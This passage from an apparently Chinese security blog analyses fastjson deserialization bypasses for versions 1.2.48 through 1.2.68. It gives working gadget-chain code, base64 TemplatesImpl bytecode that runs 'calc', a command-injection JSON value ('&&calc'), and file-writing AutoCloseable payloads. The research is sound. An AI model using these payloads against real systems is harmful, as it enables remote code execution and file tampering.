+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">rtJSONObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64Code</span> <span class="operator">=</span><span class="string">&quot;yv66vgAAADIANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAtManNvbi9UZXN0OwEACkV4Y2VwdGlvbnMHACwBAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHAC0BAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQABdAcALgEAClNvdXJjZUZpbGUBAAlUZXN0LmphdmEMAAgACQcALwwAMAAxAQAEY2FsYwwAMgAzAQAJanNvbi9UZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACwAAAA4AAwAAABEABAASAA0AEwAMAAAADAABAAAADgANAA4AAAAPAAAABAABABAAAQARABIAAQAKAAAASQAAAAQAAAABsQAAAAIACwAAAAYAAQAAABcADAAAACoABAAAAAEADQAOAAAAAAABABMAFAABAAAAAQAVABYAAgAAAAEAFwAYAAMAAQARABkAAgAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAABwADAAAACAAAwAAAAEADQAOAAAAAAABABMAFAABAAAAAQAaABsAAgAPAAAABAABABwACQAdAB4AAgAKAAAAQQACAAIAAAAJuwAFWbcABkyxAAAAAgALAAAACgACAAAAHwAIACAADAAAABYAAgAAAAkAHwAgAAAACAABACEADgABAA8AAAAEAAEAIgABACMAAAACACQ=&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(base64Code);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;666&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        jsonObject.put(<span class="string">&quot;key&quot;</span>, obj);</span><br><span class="line">        <span class="keyword">return</span> jsonObject;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="BadAttributeValueExpException"><a href="#BadAttributeValueExpException" class="headerlink" title="BadAttributeValueExpException"></a>BadAttributeValueExpException</h4><p>这里反序列化获取val属性，如果不为字符串则toString()</p>
+<p><img src="/images/a6d71b93d6979c36b43e51b33a1dab5d.png"></p>
+<p>直接反射改一下就行</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">rtBadAttributeobj</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        setFieldValue(badAttributeValueExpException,<span class="string">&quot;val&quot;</span>,rtJSONObject());</span><br><span class="line">        <span class="keyword">return</span> badAttributeValueExpException;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="fastjson-1-2-49"><a href="#fastjson-1-2-49" class="headerlink" title="fastjson&gt;&#x3D;1.2.49"></a>fastjson&gt;&#x3D;1.2.49</h3><p>为JSONObject和JSONArray写了readObject方法，反序列化时对key和value进行checkAutotype拦截恶意类使用</p>
+<p><img src="/images/e2ab28fb7b9f64e5e9674220e0843e1a.png"></p>
+<p>在其SecureObjectInputStream类当中重写了resolveClass,在其中调用了checkAutoType方法做类的检查</p>
+<p><img src="/images/1e2c787da2724f33d22f479f4412f536.png"></p>
+<p><img src="/images/fa80e1d82c9dd9d9cd47a38eb7a343d6.png"></p>
+<p>但是这种拦截实际上是不安全的，流程是其中的ObjectInputStream -&gt; readObject，然后SecureObjectInputStream.readObject()，然后再进入readObject -&gt; resolveClass</p>
+<p><img src="/images/d6c574cc980f55d2dee8cfa5dbc44183.png"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream -&gt; readObject</span><br><span class="line"><span class="title function_">xxxxxx</span><span class="params">(省略中间过程)</span></span><br><span class="line">SecureObjectInputStream -&gt; readObject -&gt; resolveClass</span><br></pre></td></tr></table></figure>
+
+<p>本身ObjectInputStream就不安全，套了一层安全的SecureObjectInputStream</p>
+<p>但是<code>SecureObjectInputStream -&gt; readObject -&gt; resolveClass</code>不会被用来处理引用类型，导致如果我们一开始传入了一个引用类型，就能直接绕过检查。</p>
+<p>而向List、set、map类型中添加同样的对象时即可成功利用</p>
+<p>伪代码长这样</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取基础恶意类</span></span><br><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImplUtil.getEvilClass(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"><span class="comment">//调getter的而已jsonArray</span></span><br><span class="line"><span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">jsonArray.add(templates);</span><br><span class="line"><span class="type">BadAttributeValueExpException</span> <span class="variable">bd</span> <span class="operator">=</span> getBadAttributeValueExpException(jsonArray);</span><br><span class="line"><span class="comment">//用arrayList包装</span></span><br><span class="line">ArrayList&lt;Object&gt; arrayList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">arrayList.add(bd);</span><br><span class="line">arrayList.add(templates);</span><br></pre></td></tr></table></figure>
+
+<p>demo：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//&lt;dependency&gt;</span></span><br><span class="line"><span class="comment">//            &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">//            &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">//            &lt;version&gt;1.2.48&lt;/version&gt;</span></span><br><span class="line"><span class="comment">//&lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">//&lt;dependency&gt;</span></span><br><span class="line"><span class="comment">//            &lt;groupId&gt;org.javassist&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">//            &lt;artifactId&gt;javassist&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">//            &lt;version&gt;3.19.0-GA&lt;/version&gt;</span></span><br><span class="line"><span class="comment">//&lt;/dependency&gt;</span></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONArray;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Fastjson2</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">rtEvilObj</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64Code</span> <span class="operator">=</span><span class="string">&quot;yv66vgAAADIANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAtManNvbi9UZXN0OwEACkV4Y2VwdGlvbnMHACwBAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHAC0BAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQABdAcALgEAClNvdXJjZUZpbGUBAAlUZXN0LmphdmEMAAgACQcALwwAMAAxAQAEY2FsYwwAMgAzAQAJanNvbi9UZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACwAAAA4AAwAAABEABAASAA0AEwAMAAAADAABAAAADgANAA4AAAAPAAAABAABABAAAQARABIAAQAKAAAASQAAAAQAAAABsQAAAAIACwAAAAYAAQAAABcADAAAACoABAAAAAEADQAOAAAAAAABABMAFAABAAAAAQAVABYAAgAAAAEAFwAYAAMAAQARABkAAgAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAABwADAAAACAAAwAAAAEADQAOAAAAAAABABMAFAABAAAAAQAaABsAAgAPAAAABAABABwACQAdAB4AAgAKAAAAQQACAAIAAAAJuwAFWbcABkyxAAAAAgALAAAACgACAAAAHwAIACAADAAAABYAAgAAAAkAHwAgAAAACAABACEADgABAA8AAAAEAAEAIgABACMAAAACACQ=&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(base64Code);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;666&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">rtJsonArray</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray.add(rtEvilObj());</span><br><span class="line">        <span class="keyword">return</span> jsonArray;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">rtBadAttributeObj</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        setFieldValue(badAttributeValueExpException,<span class="string">&quot;val&quot;</span>,rtJsonArray());</span><br><span class="line">        <span class="keyword">return</span> badAttributeValueExpException;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">rtMap</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(rtEvilObj(),rtBadAttributeObj());</span><br><span class="line">        <span class="keyword">return</span> hashMap;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">rtList</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">List</span> <span class="variable">list</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        list.add(rtEvilObj());</span><br><span class="line">        list.add(rtBadAttributeObj());</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">rtSet</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Set</span> <span class="variable">set</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">        set.add(rtEvilObj());</span><br><span class="line">        set.add(rtBadAttributeObj());</span><br><span class="line">        <span class="keyword">return</span> set;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Map:&quot;</span>+Base64.getEncoder().encodeToString(Output.serialize(rtMap()).toByteArray()));</span><br><span class="line">        System.out.println(<span class="string">&quot;List:&quot;</span>+Base64.getEncoder().encodeToString(Output.serialize(rtList()).toByteArray()));</span><br><span class="line">        System.out.println(<span class="string">&quot;Set:&quot;</span>+Base64.getEncoder().encodeToString(Output.serialize(rtSet()).toByteArray()));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="1-2-48"><a href="#1-2-48" class="headerlink" title="1.2.48&lt;&#x3D;fastjson&lt;&#x3D;1.2.68"></a>1.2.48&lt;&#x3D;fastjson&lt;&#x3D;1.2.68</h2><p><a target="_blank" rel="noopener" href="https://www.yuque.com/ph0ebus/security/orv8ct6a29f1q7yr#t0b4v">https://www.yuque.com/ph0ebus/security/orv8ct6a29f1q7yr#t0b4v</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mole_exp/article/details/122315526">https://blog.csdn.net/mole_exp&#x2F;article&#x2F;details&#x2F;122315526</a></p>
+<p><a target="_blank" rel="noopener" href="https://su18.org/post/fastjson/#8-fastjson-1268">https://su18.org/post/fastjson/#8-fastjson-1268</a></p>
+<p>如果传入了expectClass肯定是能导致绕过的</p>
+<p><img src="/images/e27b79088784a1f1e6b0790de40904f9.png"></p>
+<p>而ThrowableDeserializer、JavaBeanDeserializer中的checkAutotype正好传入了</p>
+<p><img src="/images/4c9c1dca3710e26dc4576d13f8ac28ca.png"></p>
+<h3 id="ThrowableDeserializer"><a href="#ThrowableDeserializer" class="headerlink" title="ThrowableDeserializer"></a>ThrowableDeserializer</h3><p>假设有一个有问题的Exception类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.alibaba.fastjson.parser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PingException</span> <span class="keyword">extends</span> <span class="title class_">Exception</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String domain;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">PingException</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getDomain</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> domain;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDomain</span><span class="params">(String domain)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.domain = domain;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getMessage</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;cmd /c ping &quot;</span>+domain);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> e.getMessage();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Exception&quot;</span><span class="punctuation">,</span> </span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.alibaba.fastjson.parser.PingException&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;domain&quot;</span><span class="punctuation">:</span><span class="string">&quot;b1ue.cn&amp;&amp;calc&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>这样就能通过Exception（白名单类）找到ThrowableDeserializer传入exceptClass，然后成功加载PingException类了</p>
+<p>Exception在白名单</p>
+<p><img src="/images/0c6167b872d775f809eeb594ecda8b62.png"></p>
+<p>然后通过Exception类获取到了ThrowableDeserializer</p>
+<p><img src="/images/084dc22f7b8e32a425f81faa430effbe.png"></p>
+<p>然后ThrowableDeserializer中的expectClass被传入了Throwable.class，这是绕过的关键</p>
+<p><img src="/images/d361a4ae25e81af217ff3d6e41a8c81e.png"></p>
+<p>因为传入了expectClass，所以expectClassFlag为true</p>
+<p><img src="/images/e27b79088784a1f1e6b0790de40904f9.png"></p>
+<p>然后加载出有问题的任意继承Exception类的类</p>
+<h3 id="JavaBeanDeserializer"><a href="#JavaBeanDeserializer" class="headerlink" title="JavaBeanDeserializer"></a><font style="color:rgb(77, 77, 77);">JavaBeanDeserializer</font></h3><p>JavaBeanDeserializer类似，并且expectClass可控</p>
+<p><img src="/images/0ac5cb1c595bcce5cd0528cf00662c17.png"></p>
+<p>java.lang.AutoCloseable是一个在白名单中，使用fastjson默认的反序列化器JavaBeanDeserializer，并且子类能进行许多危险操作的类，分析过程和上面差不多</p>
+<p>创建空文件</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line"><span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.io.FileOutputStream&quot;</span>,</span><br><span class="line">  <span class="string">&quot;file&quot;</span>: <span class="string">&quot;/1.txt&quot;</span>,</span><br><span class="line">  <span class="string">&quot;append&quot;</span>: <span class="string">&quot;false&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>文件迁移</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;org.aspectj&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;aspectjtools&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;<span class="number">1.9</span><span class="number">.5</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&#x27;@type&#x27;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">  <span class="string">&#x27;@type&#x27;</span>:<span class="string">&#x27;org.eclipse.core.internal.localstore.SafeFileOutputStream&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;targetPath&#x27;</span>:<span class="string">&#x27;./111&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;tempPath&#x27;</span>:<span class="string">&#x27;/tmp/111&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/friends/">friends</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
